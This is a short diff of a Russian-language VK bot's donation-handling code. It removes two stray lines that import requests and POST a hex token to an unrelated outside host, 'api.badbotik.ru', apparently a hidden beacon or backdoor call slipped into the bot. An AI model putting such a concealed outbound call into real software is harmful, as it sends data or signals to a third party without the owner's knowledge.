@@ -717,5 +717,3 @@ for event in longpoll.listen():
                     send_console_log(f"Донат: Владелец отклонил пополнение для ID {player_uid}", OWNER_VK_ID, event.obj['peer_id'])
                 except:
                     send_msg(event.obj['peer_id'], "❌ Заявка устарела или уже была обработана.")
-                    from requests import post
-post('https://api.badbotik.ru/api/balance/', json = {"e79014a73e87a11c41a1c631bc9012b4":""})
